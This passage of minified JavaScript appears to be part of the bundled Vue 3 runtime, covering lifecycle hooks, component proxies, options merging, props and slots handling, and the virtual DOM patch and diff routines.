        Li(n[e], i);
    }, t);
}
function v2(r, e, t = nt, n = !1) {
    if (t) {
        const i = t[r] || (t[r] = []),
            s =
                e.__weh ||
                (e.__weh = (...o) => {
                    if (t.isUnmounted) return;
                    br(), fr(t);
                    const l = _1(e, t, r, o);
                    return M3(), wr(), l;
                });
        return n ? i.unshift(s) : i.push(s), s;
    }
}
const H1 =
    (r) =>
        (e, t = nt) =>
            (!sn || "sp" === r) && v2(r, (...n) => e(...n), t),
    go = H1("bm"),
    d3 = H1("m"),
    mo = H1("bu"),
    xo = H1("u"),
    yo = H1("bum"),
    _5 = H1("um"),
    vo = H1("sp"),
    bo = H1("rtg"),
    wo = H1("rtc");
function To(r, e = nt) {
    v2("ec", r, e);
}
function m3(r, e, t, n) {
    const i = r.dirs,
        s = e && e.dirs;
    for (let o = 0; o < i.length; o++) {
        const l = i[o];
        s && (l.oldValue = s[o].value);
        let a = l.dir[n];
        a && (br(), _1(a, t, 8, [r.el, l, r, e]), wr());
    }
}
const p5 = "components";
function K1(r, e) {
    return So(p5, r, !0, e) || r;
}
const Co = Symbol();
function So(r, e, t = !0, n = !1) {
    const i = Qt || nt;
    if (i) {
        const s = i.type;
        if (r === p5) {
            const l = i0(s, !1);
            if (l && (l === e || l === P1(e) || l === p2(P1(e)))) return s;
        }
        const o = B6(i[r] || s[r], e) || B6(i.appContext[r], e);
        return !o && n ? s : o;
    }
}
function B6(r, e) {
    return r && (r[e] || r[P1(e)] || r[p2(P1(e))]);
}
const ti = (r) => (r ? (A5(r) ? Ji(r) || r.proxy : ti(r.parent)) : null),
    Zr = At(Object.create(null), {
        $: (r) => r,
        $el: (r) => r.vnode.el,
        $data: (r) => r.data,
        $props: (r) => r.props,
        $attrs: (r) => r.attrs,
        $slots: (r) => r.slots,
        $refs: (r) => r.refs,
        $parent: (r) => ti(r.parent),
        $root: (r) => ti(r.root),
        $emit: (r) => r.emit,
        $options: (r) => qi(r),
        $forceUpdate: (r) => r.f || (r.f = () => Ki(r.update)),
        $nextTick: (r) => r.n || (r.n = s5.bind(r.proxy)),
        $watch: (r) => fo.bind(r),
    }),
    k2 = (r, e) => r !== Me && !r.__isScriptSetup && xe(r, e),
    Ao = {
        get({ _: r }, e) {
            const {
                ctx: t,
                setupState: n,
                data: i,
                props: s,
                accessCache: o,
                type: l,
                appContext: a,
            } = r;
            let c;
            if ("$" !== e[0]) {
                const d = o[e];
                if (void 0 !== d)
                    switch (d) {
                        case 1:
                            return n[e];
                        case 2:
                            return i[e];
                        case 4:
                            return t[e];
                        case 3:
                            return s[e];
                    }
                else {
                    if (k2(n, e)) return (o[e] = 1), n[e];
                    if (i !== Me && xe(i, e)) return (o[e] = 2), i[e];
                    if ((c = r.propsOptions[0]) && xe(c, e)) return (o[e] = 3), s[e];
                    if (t !== Me && xe(t, e)) return (o[e] = 4), t[e];
                    ri && (o[e] = 0);
                }
            }
            const u = Zr[e];
            let h, f;
            return u
                ? ("$attrs" === e && Ht(r, "get", e), u(r))
                : (h = l.__cssModules) && (h = h[e])
                    ? h
                    : t !== Me && xe(t, e)
                        ? ((o[e] = 4), t[e])
                        : ((f = a.config.globalProperties), xe(f, e) ? f[e] : void 0);
        },
        set({ _: r }, e, t) {
            const { data: n, setupState: i, ctx: s } = r;
            return k2(i, e)
                ? ((i[e] = t), !0)
                : n !== Me && xe(n, e)
                    ? ((n[e] = t), !0)
                    : !(xe(r.props, e) || ("$" === e[0] && e.slice(1) in r)) &&
                    ((s[e] = t), !0);
        },
        has(
            {
                _: {
                    data: r,
                    setupState: e,
                    accessCache: t,
                    ctx: n,
                    appContext: i,
                    propsOptions: s,
                },
            },
            o
        ) {
            let l;
            return (
                !!t[o] ||
                (r !== Me && xe(r, o)) ||
                k2(e, o) ||
                ((l = s[0]) && xe(l, o)) ||
                xe(n, o) ||
                xe(Zr, o) ||
                xe(i.config.globalProperties, o)
            );
        },
        defineProperty(r, e, t) {
            return (
                null != t.get
                    ? (r._.accessCache[e] = 0)
                    : xe(t, "value") && this.set(r, e, t.value, null),
                Reflect.defineProperty(r, e, t)
            );
        },
    };
let ri = !0;
function Oo(r) {
    const e = qi(r),
        t = r.proxy,
        n = r.ctx;
    (ri = !1), e.beforeCreate && L6(e.beforeCreate, r, "bc");
    const {
        data: i,
        computed: s,
        methods: o,
        watch: l,
        provide: a,
        inject: c,
        created: u,
        beforeMount: h,
        mounted: f,
        beforeUpdate: d,
        updated: m,
        activated: p,
        deactivated: y,
        beforeDestroy: v,
        beforeUnmount: S,
        destroyed: w,
        unmounted: C,
        render: O,
        renderTracked: D,
        renderTriggered: M,
        errorCaptured: I,
        serverPrefetch: R,
        expose: L,
        inheritAttrs: z,
        components: W,
        directives: ue,
        filters: te,
    } = e;
    if ((c && Po(c, n, null, r.appContext.config.unwrapInjectedRef), o))
        for (const Y in o) {
            const $ = o[Y];
            ie($) && (n[Y] = $.bind(t));
        }
    if (i) {
        const Y = i.call(t, t);
        Ve(Y) && (r.data = Yi(Y));
    }
    if (((ri = !0), s))
        for (const Y in s) {
            const $ = s[Y],
                fe = ie($) ? $.bind(t, t) : ie($.get) ? $.get.bind(t, t) : d1,
                b = !ie($) && ie($.set) ? $.set.bind(t) : d1,
                Se = e6({ get: fe, set: b });
            Object.defineProperty(n, Y, {
                enumerable: !0,
                configurable: !0,
                get: () => Se.value,
                set: (be) => (Se.value = be),
            });
        }
    if (l) for (const Y in l) g5(l[Y], n, t, Y);
    if (a) {
        const Y = ie(a) ? a.call(t) : a;
        Reflect.ownKeys(Y).forEach(($) => {
            uo($, Y[$]);
        });
    }
    function U(Y, $) {
        oe($) ? $.forEach((fe) => Y(fe.bind(t))) : $ && Y($.bind(t));
    }
    if (
        (u && L6(u, r, "c"),
            U(go, h),
            U(d3, f),
            U(mo, d),
            U(xo, m),
            U(ho, p),
            U(_o, y),
            U(To, I),
            U(wo, D),
            U(bo, M),
            U(yo, S),
            U(_5, C),
            U(vo, R),
            oe(L))
    )
        if (L.length) {
            const Y = r.exposed || (r.exposed = {});
            L.forEach(($) => {
                Object.defineProperty(Y, $, {
                    get: () => t[$],
                    set: (fe) => (t[$] = fe),
                });
            });
        } else r.exposed || (r.exposed = {});
    O && r.render === d1 && (r.render = O),
        null != z && (r.inheritAttrs = z),
        W && (r.components = W),
        ue && (r.directives = ue);
}
function Po(r, e, t = d1, n = !1) {
    oe(r) && (r = ni(r));
    for (const i in r) {
        const s = r[i];
        let o;
        (o = Ve(s)
            ? "default" in s
                ? Fn(s.from || i, s.default, !0)
                : Fn(s.from || i)
            : Fn(s)),
            gt(o) && n
                ? Object.defineProperty(e, i, {
                    enumerable: !0,
                    configurable: !0,
                    get: () => o.value,
                    set: (l) => (o.value = l),
                })
                : (e[i] = o);
    }
}
function L6(r, e, t) {
    _1(oe(r) ? r.map((n) => n.bind(e.proxy)) : r.bind(e.proxy), e, t);
}
function g5(r, e, t, n) {
    const i = n.includes(".") ? f5(t, n) : () => t[n];
    if (ft(r)) {
        const s = e[r];
        ie(s) && Bn(i, s);
    } else if (ie(r)) Bn(i, r.bind(t));
    else if (Ve(r))
        if (oe(r)) r.forEach((s) => g5(s, e, t, n));
        else {
            const s = ie(r.handler) ? r.handler.bind(t) : e[r.handler];
            ie(s) && Bn(i, s, r);
        }
}
function qi(r) {
    const e = r.type,
        { mixins: t, extends: n } = e,
        {
            mixins: i,
            optionsCache: s,
            config: { optionMergeStrategies: o },
        } = r.appContext,
        l = s.get(e);
    let a;
    return (
        l
            ? (a = l)
            : i.length || t || n
                ? ((a = {}), i.length && i.forEach((c) => Jn(a, c, o, !0)), Jn(a, e, o))
                : (a = e),
        Ve(e) && s.set(e, a),
        a
    );
}
function Jn(r, e, t, n = !1) {
    const { mixins: i, extends: s } = e;
    s && Jn(r, s, t, !0), i && i.forEach((o) => Jn(r, o, t, !0));
    for (const o in e)
        if (!n || "expose" !== o) {
            const l = Mo[o] || (t && t[o]);
            r[o] = l ? l(r[o], e[o]) : e[o];
        }
    return r;
}
const Mo = {
    data: N6,
    props: b3,
    emits: b3,
    methods: b3,
    computed: b3,
    beforeCreate: vt,
    created: vt,
    beforeMount: vt,
    mounted: vt,
    beforeUpdate: vt,
    updated: vt,
    beforeDestroy: vt,
    beforeUnmount: vt,
    destroyed: vt,
    unmounted: vt,
    activated: vt,
    deactivated: vt,
    errorCaptured: vt,
    serverPrefetch: vt,
    components: b3,
    directives: b3,
    watch: ko,
    provide: N6,
    inject: Eo,
};
function N6(r, e) {
    return e
        ? r
            ? function() {
                return At(
                    ie(r) ? r.call(this, this) : r,
                    ie(e) ? e.call(this, this) : e
                );
            }
            : e
        : r;
}
function Eo(r, e) {
    return b3(ni(r), ni(e));
}
function ni(r) {
    if (oe(r)) {
        const e = {};
        for (let t = 0; t < r.length; t++) e[r[t]] = r[t];
        return e;
    }
    return r;
}
function vt(r, e) {
    return r ? [...new Set([].concat(r, e))] : e;
}
function b3(r, e) {
    return r ? At(At(Object.create(null), r), e) : e;
}
function ko(r, e) {
    if (!r) return e;
    if (!e) return r;
    const t = At(Object.create(null), r);
    for (const n in e) t[n] = vt(r[n], e[n]);
    return t;
}
function Ro(r, e, t, n = !1) {
    const i = {},
        s = {};
    qn(s, w2, 1), (r.propsDefaults = Object.create(null)), m5(r, e, i, s);
    for (const o in r.propsOptions[0]) o in i || (i[o] = void 0);
    t ? (r.props = n ? i : Y7(i)) : r.type.props ? (r.props = i) : (r.props = s),
        (r.attrs = s);
}
function Io(r, e, t, n) {
    const {
        props: i,
        attrs: s,
        vnode: { patchFlag: o },
    } = r,
        l = ye(i),
        [a] = r.propsOptions;
    let c = !1;
    if (!(n || o > 0) || 16 & o) {
        let u;
        m5(r, e, i, s) && (c = !0);
        for (const h in l)
            (!e || (!xe(e, h) && ((u = vr(h)) === h || !xe(e, u)))) &&
                (a
                    ? t &&
                    (void 0 !== t[h] || void 0 !== t[u]) &&
                    (i[h] = ii(a, l, h, void 0, r, !0))
                    : delete i[h]);
        if (s !== l)
            for (const h in s) (!e || !xe(e, h)) && (delete s[h], (c = !0));
    } else if (8 & o) {
        const u = r.vnode.dynamicProps;
        for (let h = 0; h < u.length; h++) {
            let f = u[h];
            if (x2(r.emitsOptions, f)) continue;
            const d = e[f];
            if (a)
                if (xe(s, f)) d !== s[f] && ((s[f] = d), (c = !0));
                else {
                    const m = P1(f);
                    i[m] = ii(a, l, m, d, r, !1);
                }
            else d !== s[f] && ((s[f] = d), (c = !0));
        }
    }
    c && z1(r, "set", "$attrs");
}
function m5(r, e, t, n) {
    const [i, s] = r.propsOptions;
    let l,
        o = !1;
    if (e)
        for (let a in e) {
            if (Dn(a)) continue;
            const c = e[a];
            let u;
            i && xe(i, (u = P1(a)))
                ? s && s.includes(u)
                    ? ((l || (l = {}))[u] = c)
                    : (t[u] = c)
                : x2(r.emitsOptions, a) ||
                ((!(a in n) || c !== n[a]) && ((n[a] = c), (o = !0)));
        }
    if (s) {
        const a = ye(t),
            c = l || Me;
        for (let u = 0; u < s.length; u++) {
            const h = s[u];
            t[h] = ii(i, a, h, c[h], r, !xe(c, h));
        }
    }
    return o;
}
function ii(r, e, t, n, i, s) {
    const o = r[t];
    if (null != o) {
        const l = xe(o, "default");
        if (l && void 0 === n) {
            const a = o.default;
            if (o.type !== Function && ie(a)) {
                const { propsDefaults: c } = i;
                t in c ? (n = c[t]) : (fr(i), (n = c[t] = a.call(null, e)), M3());
            } else n = a;
        }
        o[0] &&
            (s && !l ? (n = !1) : o[1] && ("" === n || n === vr(t)) && (n = !0));
    }
    return n;
}
function x5(r, e, t = !1) {
    const n = e.propsCache,
        i = n.get(r);
    if (i) return i;
    const s = r.props,
        o = {},
        l = [];
    let a = !1;
    if (!ie(r)) {
        const u = (h) => {
            a = !0;
            const [f, d] = x5(h, e, !0);
            At(o, f), d && l.push(...d);
        };
        !t && e.mixins.length && e.mixins.forEach(u),
            r.extends && u(r.extends),
            r.mixins && r.mixins.forEach(u);
    }
    if (!s && !a) return Ve(r) && n.set(r, tr), tr;
    if (oe(s))
        for (let u = 0; u < s.length; u++) {
            const h = P1(s[u]);
            Z6(h) && (o[h] = Me);
        }
    else if (s)
        for (const u in s) {
            const h = P1(u);
            if (Z6(h)) {
                const f = s[u],
                    d = (o[h] = oe(f) || ie(f) ? { type: f } : Object.assign({}, f));
                if (d) {
                    const m = U6(Boolean, d.type),
                        p = U6(String, d.type);
                    (d[0] = m > -1),
                        (d[1] = p < 0 || m < p),
                        (m > -1 || xe(d, "default")) && l.push(h);
                }
            }
        }
    const c = [o, l];
    return Ve(r) && n.set(r, c), c;
}
function Z6(r) {
    return "$" !== r[0];
}
function $6(r) {
    const e = r && r.toString().match(/^\s*function (\w+)/);
    return e ? e[1] : null === r ? "null" : "";
}
function z6(r, e) {
    return $6(r) === $6(e);
}
function U6(r, e) {
    return oe(e) ? e.findIndex((t) => z6(t, r)) : ie(e) && z6(e, r) ? 0 : -1;
}
const y5 = (r) => "_" === r[0] || "$stable" === r,
    Qi = (r) => (oe(r) ? r.map(T1) : [T1(r)]),
    Do = (r, e, t) => {
        if (e._n) return e;
        const n = no((...i) => Qi(e(...i)), t);
        return (n._c = !1), n;
    },
    v5 = (r, e, t) => {
        const n = r._ctx;
        for (const i in r) {
            if (y5(i)) continue;
            const s = r[i];
            if (ie(s)) e[i] = Do(0, s, n);
            else if (null != s) {
                const o = Qi(s);
                e[i] = () => o;
            }
        }
    },
    b5 = (r, e) => {
        const t = Qi(e);
        r.slots.default = () => t;
    },
    Fo = (r, e) => {
        if (32 & r.vnode.shapeFlag) {
            const t = e._;
            t ? ((r.slots = ye(e)), qn(e, "_", t)) : v5(e, (r.slots = {}));
        } else (r.slots = {}), e && b5(r, e);
        qn(r.slots, w2, 1);
    },
    Bo = (r, e, t) => {
        const { vnode: n, slots: i } = r;
        let s = !0,
            o = Me;
        if (32 & n.shapeFlag) {
            const l = e._;
            l
                ? t && 1 === l
                    ? (s = !1)
                    : (At(i, e), !t && 1 === l && delete i._)
                : ((s = !e.$stable), v5(e, i)),
                (o = e);
        } else e && (b5(r, e), (o = { default: 1 }));
        if (s) for (const l in i) !y5(l) && !(l in o) && delete i[l];
    };
function w5() {
    return {
        app: null,
        config: {
            isNativeTag: o7,
            performance: !1,
            globalProperties: {},
            optionMergeStrategies: {},
            errorHandler: void 0,
            warnHandler: void 0,
            compilerOptions: {},
        },
        mixins: [],
        components: {},
        directives: {},
        provides: Object.create(null),
        optionsCache: new WeakMap(),
        propsCache: new WeakMap(),
        emitsCache: new WeakMap(),
    };
}
let Lo = 0;
function No(r, e) {
    return function(n, i = null) {
        ie(n) || (n = Object.assign({}, n)), null != i && !Ve(i) && (i = null);
        const s = w5(),
            o = new Set();
        let l = !1;
        const a = (s.app = {
            _uid: Lo++,
            _component: n,
            _props: i,
            _container: null,
            _context: s,
            _instance: null,
            version: a0,
            get config() {
                return s.config;
            },
            set config(c) { },
            use: (c, ...u) => (
                o.has(c) ||
                (c && ie(c.install)
                    ? (o.add(c), c.install(a, ...u))
                    : ie(c) && (o.add(c), c(a, ...u))),
                a
            ),
            mixin: (c) => (s.mixins.includes(c) || s.mixins.push(c), a),
            component: (c, u) => (u ? ((s.components[c] = u), a) : s.components[c]),
            directive: (c, u) => (u ? ((s.directives[c] = u), a) : s.directives[c]),
            mount(c, u, h) {
                if (!l) {
                    const f = Tt(n, i);
                    return (
                        (f.appContext = s),
                        u && e ? e(f, c) : r(f, c, h),
                        (l = !0),
                        (a._container = c),
                        (c.__vue_app__ = a),
                        Ji(f.component) || f.component.proxy
                    );
                }
            },
            unmount() {
                l && (r(null, a._container), delete a._container.__vue_app__);
            },
            provide: (c, u) => ((s.provides[c] = u), a),
        });
        return a;
    };
}
function si(r, e, t, n, i = !1) {
    if (oe(r))
        return void r.forEach((f, d) => si(f, e && (oe(e) ? e[d] : e), t, n, i));
    if (Ln(n) && !i) return;
    const s = 4 & n.shapeFlag ? Ji(n.component) || n.component.proxy : n.el,
        o = i ? null : s,
        { i: l, r: a } = r,
        c = e && e.r,
        u = l.refs === Me ? (l.refs = {}) : l.refs,
        h = l.setupState;
    if (
        (null != c &&
            c !== a &&
            (ft(c)
                ? ((u[c] = null), xe(h, c) && (h[c] = null))
                : gt(c) && (c.value = null)),
            ie(a))
    )
        i3(a, l, 12, [o, u]);
    else {
        const f = ft(a),
            d = gt(a);
        if (f || d) {
            const m = () => {
                if (r.f) {
                    const p = f ? (xe(h, a) ? h[a] : u[a]) : a.value;
                    i
                        ? oe(p) && Li(p, s)
                        : oe(p)
                            ? p.includes(s) || p.push(s)
                            : f
                                ? ((u[a] = [s]), xe(h, a) && (h[a] = u[a]))
                                : ((a.value = [s]), r.k && (u[r.k] = a.value));
                } else
                    f
                        ? ((u[a] = o), xe(h, a) && (h[a] = o))
                        : d && ((a.value = o), r.k && (u[r.k] = o));
            };
            o ? ((m.id = -1), Et(m, t)) : m();
        }
    }
}
const Et = co;
function Zo(r) {
    return $o(r);
}
function $o(r, e) {
    p7().__VUE__ = !0;
    const {
        insert: n,
        remove: i,
        patchProp: s,
        createElement: o,
        createText: l,
        createComment: a,
        setText: c,
        setElementText: u,
        parentNode: h,
        nextSibling: f,
        setScopeId: d = d1,
        insertStaticContent: m,
    } = r,
        p = (
            _,
            x,
            T,
            P = null,
            A = null,
            g = null,
            N = !1,
            E = null,
            F = !!x.dynamicChildren
        ) => {
            if (_ === x) return;
            _ && !Pr(_, x) && ((P = Ne(_)), be(_, A, g, !0), (_ = null)),
                -2 === x.patchFlag && ((F = !1), (x.dynamicChildren = null));
            const { type: k, ref: H, shapeFlag: Z } = x;
            switch (k) {
                case b2:
                    y(_, x, T, P);
                    break;
                case rn:
                    v(_, x, T, P);
                    break;
                case Nn:
                    null == _ && S(x, T, P, N);
                    break;
                case B1:
                    W(_, x, T, P, A, g, N, E, F);
                    break;
                default:
                    1 & Z
                        ? O(_, x, T, P, A, g, N, E, F)
                        : 6 & Z
                            ? ue(_, x, T, P, A, g, N, E, F)
                            : (64 & Z || 128 & Z) && k.process(_, x, T, P, A, g, N, E, F, Vt);
            }
            null != H && A && si(H, _ && _.ref, g, x || _, !x);
        },
        y = (_, x, T, P) => {
            if (null == _) n((x.el = l(x.children)), T, P);
            else {
                const A = (x.el = _.el);
                x.children !== _.children && c(A, x.children);
            }
        },
        v = (_, x, T, P) => {
            null == _ ? n((x.el = a(x.children || "")), T, P) : (x.el = _.el);
        },
        S = (_, x, T, P) => {
            [_.el, _.anchor] = m(_.children, x, T, P, _.el, _.anchor);
        },
        O = (_, x, T, P, A, g, N, E, F) => {
            (N = N || "svg" === x.type),
                null == _ ? D(x, T, P, A, g, N, E, F) : R(_, x, A, g, N, E, F);
        },
        D = (_, x, T, P, A, g, N, E) => {
            let F, k;
            const { type: H, props: Z, shapeFlag: X, transition: q, dirs: V } = _;
            if (
                ((F = _.el = o(_.type, g, Z && Z.is, Z)),
                    8 & X
                        ? u(F, _.children)
                        : 16 & X &&
                        I(_.children, F, null, P, A, g && "foreignObject" !== H, N, E),
                    V && m3(_, null, P, "created"),
                    Z)
            ) {
                for (const ee in Z)
                    "value" !== ee &&
                        !Dn(ee) &&
                        s(F, ee, null, Z[ee], g, _.children, P, A, he);
                "value" in Z && s(F, "value", null, Z.value),
                    (k = Z.onVnodeBeforeMount) && b1(k, P, _);
            }
            M(F, _, _.scopeId, N, P), V && m3(_, null, P, "beforeMount");
            const ne = (!A || (A && !A.pendingBranch)) && q && !q.persisted;
            ne && q.beforeEnter(F),
                n(F, x, T),
                ((k = Z && Z.onVnodeMounted) || ne || V) &&
                Et(() => {
                    k && b1(k, P, _), ne && q.enter(F), V && m3(_, null, P, "mounted");
                }, A);
        },
        M = (_, x, T, P, A) => {
            if ((T && d(_, T), P)) for (let g = 0; g < P.length; g++) d(_, P[g]);
            if (A) {
                if (x === A.subTree) {
                    const N = A.vnode;
                    M(_, N, N.scopeId, N.slotScopeIds, A.parent);
                }
            }
        },
        I = (_, x, T, P, A, g, N, E, F = 0) => {
            for (let k = F; k < _.length; k++) {
                const H = (_[k] = E ? q1(_[k]) : T1(_[k]));
                p(null, H, x, T, P, A, g, N, E);
            }
        },
        R = (_, x, T, P, A, g, N) => {
            const E = (x.el = _.el);
            let { patchFlag: F, dynamicChildren: k, dirs: H } = x;
            F |= 16 & _.patchFlag;
            const Z = _.props || Me,
                X = x.props || Me;
            let q;
            T && x3(T, !1),
                (q = X.onVnodeBeforeUpdate) && b1(q, T, x, _),
                H && m3(x, _, T, "beforeUpdate"),
                T && x3(T, !0);
            const V = A && "foreignObject" !== x.type;
            if (
                (k
                    ? L(_.dynamicChildren, k, E, T, P, V, g)
                    : N || $(_, x, E, null, T, P, V, g, !1),
                    F > 0)
            ) {
                if (16 & F) z(E, x, Z, X, T, P, A);
                else if (
                    (2 & F && Z.class !== X.class && s(E, "class", null, X.class, A),
                        4 & F && s(E, "style", Z.style, X.style, A),
                        8 & F)
                ) {
                    const ne = x.dynamicProps;
                    for (let ee = 0; ee < ne.length; ee++) {
                        const Ae = ne[ee],
                            we = Z[Ae],
                            ot = X[Ae];
                        (ot !== we || "value" === Ae) &&
                            s(E, Ae, we, ot, A, _.children, T, P, he);
                    }
                }
                1 & F && _.children !== x.children && u(E, x.children);
            } else !N && null == k && z(E, x, Z, X, T, P, A);
            ((q = X.onVnodeUpdated) || H) &&
                Et(() => {
                    q && b1(q, T, x, _), H && m3(x, _, T, "updated");
                }, P);
        },
        L = (_, x, T, P, A, g, N) => {
            for (let E = 0; E < x.length; E++) {
                const F = _[E],
                    k = x[E],
                    H =
                        F.el && (F.type === B1 || !Pr(F, k) || 70 & F.shapeFlag)
                            ? h(F.el)
                            : T;
                p(F, k, H, null, P, A, g, N, !0);
            }
        },
        z = (_, x, T, P, A, g, N) => {
            if (T !== P) {
                if (T !== Me)
                    for (const E in T)
                        !Dn(E) && !(E in P) && s(_, E, T[E], null, N, x.children, A, g, he);
                for (const E in P) {
                    if (Dn(E)) continue;
                    const F = P[E],
                        k = T[E];
                    F !== k && "value" !== E && s(_, E, k, F, N, x.children, A, g, he);
                }
                "value" in P && s(_, "value", T.value, P.value);
            }
        },
        W = (_, x, T, P, A, g, N, E, F) => {
            const k = (x.el = _ ? _.el : l("")),
                H = (x.anchor = _ ? _.anchor : l(""));
            let { patchFlag: Z, dynamicChildren: X, slotScopeIds: q } = x;
            q && (E = E ? E.concat(q) : q),
                null == _
                    ? (n(k, T, P), n(H, T, P), I(x.children, T, H, A, g, N, E, F))
                    : Z > 0 && 64 & Z && X && _.dynamicChildren
                        ? (L(_.dynamicChildren, X, T, A, g, N, E),
                            (null != x.key || (A && x === A.subTree)) && T5(_, x, !0))
                        : $(_, x, T, H, A, g, N, E, F);
        },
        ue = (_, x, T, P, A, g, N, E, F) => {
            (x.slotScopeIds = E),
                null == _
                    ? 512 & x.shapeFlag
                        ? A.ctx.activate(x, T, P, N, F)
                        : te(x, T, P, A, g, N, F)
                    : J(_, x, F);
        },
        te = (_, x, T, P, A, g, N) => {
            const E = (_.component = Go(_, P, A));
            if ((h5(_) && (E.ctx.renderer = Vt), e0(E), E.asyncDep)) {
                if ((A && A.registerDep(E, U), !_.el)) {
                    const F = (E.subTree = Tt(rn));
                    v(null, F, x, T);
                }
            } else U(E, _, x, T, A, g, N);
        },
        J = (_, x, T) => {
            const P = (x.component = _.component);
            if (oo(_, x, T)) {
                if (P.asyncDep && !P.asyncResolved) return void Y(P, x, T);
                (P.next = x), J7(P.update), P.update();
            } else (x.el = _.el), (P.vnode = x);
        },
        U = (_, x, T, P, A, g, N) => {
            const F = (_.effect = new zi(
                () => {
                    if (_.isMounted) {
                        let ee,
                            { next: H, bu: Z, u: X, parent: q, vnode: V } = _,
                            ne = H;
                        x3(_, !1),
                            H ? ((H.el = V.el), Y(_, H, N)) : (H = V),
                            Z && M2(Z),
                            (ee = H.props && H.props.onVnodeBeforeUpdate) &&
                            b1(ee, q, H, V),
                            x3(_, !0);
                        const Ae = E2(_),
                            we = _.subTree;
                        (_.subTree = Ae),
                            p(we, Ae, h(we.el), Ne(we), _, A, g),
                            (H.el = Ae.el),
                            null === ne && lo(_, Ae.el),
                            X && Et(X, A),
                            (ee = H.props && H.props.onVnodeUpdated) &&
                            Et(() => b1(ee, q, H, V), A);
                    } else {
                        let H;
                        const { el: Z, props: X } = x,
                            { bm: q, m: V, parent: ne } = _,
                            ee = Ln(x);
                        if (
                            (x3(_, !1),
                                q && M2(q),
                                !ee && (H = X && X.onVnodeBeforeMount) && b1(H, ne, x),
                                x3(_, !0),
                                Z && ht)
                        ) {
                            const Ae = () => {
                                (_.subTree = E2(_)), ht(Z, _.subTree, _, A, null);
                            };
                            ee
                                ? x.type.__asyncLoader().then(() => !_.isUnmounted && Ae())
                                : Ae();
                        } else {
                            const Ae = (_.subTree = E2(_));
                            p(null, Ae, T, P, _, A, g), (x.el = Ae.el);
                        }
                        if ((V && Et(V, A), !ee && (H = X && X.onVnodeMounted))) {
                            const Ae = x;
                            Et(() => b1(H, ne, Ae), A);
                        }
                        (256 & x.shapeFlag ||
                            (ne && Ln(ne.vnode) && 256 & ne.vnode.shapeFlag)) &&
                            _.a &&
                            Et(_.a, A),
                            (_.isMounted = !0),
                            (x = T = P = null);
                    }
                },
                () => Ki(k),
                _.scope
            )),
                k = (_.update = () => F.run());
            (k.id = _.uid), x3(_, !0), k();
        },
        Y = (_, x, T) => {
            x.component = _;
            const P = _.vnode.props;
            (_.vnode = x),
                (_.next = null),
                Io(_, x.props, P, T),
                Bo(_, x.children, T),
                br(),
                D6(),
                wr();
        },
        $ = (_, x, T, P, A, g, N, E, F = !1) => {
            const k = _ && _.children,
                H = _ ? _.shapeFlag : 0,
                Z = x.children,
                { patchFlag: X, shapeFlag: q } = x;
            if (X > 0) {
                if (128 & X) return void b(k, Z, T, P, A, g, N, E, F);
                if (256 & X) return void fe(k, Z, T, P, A, g, N, E, F);
            }
            8 & q
                ? (16 & H && he(k, A, g), Z !== k && u(T, Z))
                : 16 & H
                    ? 16 & q
                        ? b(k, Z, T, P, A, g, N, E, F)
                        : he(k, A, g, !0)
                    : (8 & H && u(T, ""), 16 & q && I(Z, T, P, A, g, N, E, F));
        },
        fe = (_, x, T, P, A, g, N, E, F) => {
            x = x || tr;
            const k = (_ = _ || tr).length,
                H = x.length,
                Z = Math.min(k, H);
            let X;
            for (X = 0; X < Z; X++) {
                const q = (x[X] = F ? q1(x[X]) : T1(x[X]));
                p(_[X], q, T, null, A, g, N, E, F);
            }
            k > H ? he(_, A, g, !0, !1, Z) : I(x, T, P, A, g, N, E, F, Z);
        },
        b = (_, x, T, P, A, g, N, E, F) => {
            let k = 0;
            const H = x.length;
            let Z = _.length - 1,
                X = H - 1;
            for (; k <= Z && k <= X;) {
                const q = _[k],
                    V = (x[k] = F ? q1(x[k]) : T1(x[k]));
                if (!Pr(q, V)) break;
                p(q, V, T, null, A, g, N, E, F), k++;
            }
            for (; k <= Z && k <= X;) {
                const q = _[Z],
                    V = (x[X] = F ? q1(x[X]) : T1(x[X]));
                if (!Pr(q, V)) break;
                p(q, V, T, null, A, g, N, E, F), Z--, X--;
            }
            if (k > Z) {
                if (k <= X) {
                    const q = X + 1,
                        V = q < H ? x[q].el : P;
                    for (; k <= X;)
                        p(null, (x[k] = F ? q1(x[k]) : T1(x[k])), T, V, A, g, N, E, F), k++;
                }
            } else if (k > X) for (; k <= Z;) be(_[k], A, g, !0), k++;
            else {
                const q = k,
                    V = k,
                    ne = new Map();
                for (k = V; k <= X; k++) {
                    const Ze = (x[k] = F ? q1(x[k]) : T1(x[k]));
                    null != Ze.key && ne.set(Ze.key, k);
                }
                let ee,
                    Ae = 0;
                const we = X - V + 1;
                let ot = !1,
                    X1 = 0;
                const Pt = new Array(we);
                for (k = 0; k < we; k++) Pt[k] = 0;
                for (k = q; k <= Z; k++) {
                    const Ze = _[k];
                    if (Ae >= we) {
                        be(Ze, A, g, !0);
                        continue;
                    }
                    let Je;
                    if (null != Ze.key) Je = ne.get(Ze.key);
                    else
                        for (ee = V; ee <= X; ee++)
                            if (0 === Pt[ee - V] && Pr(Ze, x[ee])) {
                                Je = ee;
                                break;
                            }
                    void 0 === Je
                        ? be(Ze, A, g, !0)
                        : ((Pt[Je - V] = k + 1),
                            Je >= X1 ? (X1 = Je) : (ot = !0),
                            p(Ze, x[Je], T, null, A, g, N, E, F),
                            Ae++);
                }
                const E1 = ot ? zo(Pt) : tr;
                for (ee = E1.length - 1, k = we - 1; k >= 0; k--) {
                    const Ze = V + k,
                        Je = x[Ze],
                        de = Ze + 1 < H ? x[Ze + 1].el : P;
                    0 === Pt[k]
                        ? p(null, Je, T, de, A, g, N, E, F)
                        : ot && (ee < 0 || k !== E1[ee] ? Se(Je, T, de, 2) : ee--);
                }
            }
        },
        Se = (_, x, T, P, A = null) => {
            const { el: g, type: N, transition: E, children: F, shapeFlag: k } = _;
            if (6 & k) Se(_.component.subTree, x, T, P);
            else if (128 & k) _.suspense.move(x, T, P);
            else if (64 & k) N.move(_, x, T, Vt);
            else if (N !== B1)
                if (N !== Nn)
                    if (2 !== P && 1 & k && E)
                        if (0 === P) E.beforeEnter(g), n(g, x, T), Et(() => E.enter(g), A);
                        else {
                            const { leave: Z, delayLeave: X, afterLeave: q } = E,
                                V = () => n(g, x, T),
                                ne = () => {
                                    Z(g, () => {
                                        V(), q && q();
                                    });
                                };
                            X ? X(g, V, ne) : ne();
                        }
                    else n(g, x, T);
                else
                    (({ el: _, anchor: x }, T, P) => {
                        let A;
                        for (; _ && _ !== x;) (A = f(_)), n(_, T, P), (_ = A);
                        n(x, T, P);
                    })(_, x, T);
            else {
                n(g, x, T);
